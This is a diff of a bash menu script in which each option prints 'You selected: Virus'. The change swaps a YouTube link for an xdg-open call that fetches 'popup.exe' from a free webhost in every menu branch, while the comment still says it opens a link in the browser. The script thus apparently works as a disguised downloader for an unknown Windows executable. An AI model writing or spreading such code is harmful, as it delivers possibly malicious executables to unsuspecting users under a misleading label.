@@ -35,27 +35,27 @@ display_art
         1)
             echo "You selected: Virus"
             # Add code to run the other bash script here
-            xdg-open "https://www.youtube.com/techhacker7"  # Open link in default browser
+            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
             ;;
         2)
             echo "You selected: Virus"
             # Add code to run the other bash script here
-            xdg-open "https://www.youtube.com/techhacker7"  # Open link in default browser
+            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
             ;;
         3)
             echo "You selected: Virus"
             # Add code to run the other bash script here
-            xdg-open "https://www.youtube.com/techhacker7"  # Open link in default browser
+            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
             ;;
 	    4)
             echo "You selected: Virus"
             # Add code to run the other bash script here
-            xdg-open "https://www.youtube.com/techhacker7"  # Open link in default browser
+            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
             ;;
 		5)
             echo "You selected: Virus"
             # Add code to run the other bash script here
-            xdg-open "https://www.youtube.com/techhacker7"  # Open link in default browser
+            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
             ;;
         6)
             echo "Exiting..."
